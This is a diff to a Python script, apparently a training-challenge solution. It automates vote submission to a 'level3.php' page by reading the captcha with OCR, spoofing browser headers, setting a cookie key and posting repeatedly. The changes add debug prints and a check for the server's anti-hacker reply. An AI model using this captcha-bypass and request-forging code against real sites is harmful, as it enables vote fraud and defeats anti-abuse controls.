@@ -61,21 +61,31 @@ def get_captcha(image):
 	return (pyte.image_to_string(img))
 
 log = init_logger()
+print("Inicializa logger")
 url = "http://158.69.76.135/level3.php"
 key = found_key(url)
+print("Key founded -> {}".format(key))
 image = get_image()
 captcha = get_captcha(image)
-header_key = {"Cookie":"HoldTheDoor={}".format(key), "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
-, "referer":url}
-data_key = {"id":"2277", "holdthedoor":"Submit+Query", "key":key, "captcha":captcha[:4]}
+try:
+    captcha = captcha[:4]
+except:
+    print("Captcha not obtained correctly")
+print("Captcha obtained -> {}".format(captcha))
+header_key = {"Cookie":"HoldTheDoor={}".format(key), "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
+"Referer": url}
+data_key = {"id":"2277", "holdthedoor":"Submit+Query", "key":key, "captcha":captcha}
 print(data_key)
 
 #print("Sending requests....")
-
+for j in data_key.values():
+    print(j)
 for i in range(10):
     try:
-        requests.post(url, data = data_key, headers = header_key)
-        log.info("Success")
+        r = requests.post(url, data = data_key, headers = header_key)
+        if str(r.content) != "b'See you later hacker! [11]'":    
+            log.info("Success")
+        print(str(r.content))
     except:
         log.info("Fail")
 print("Finish")
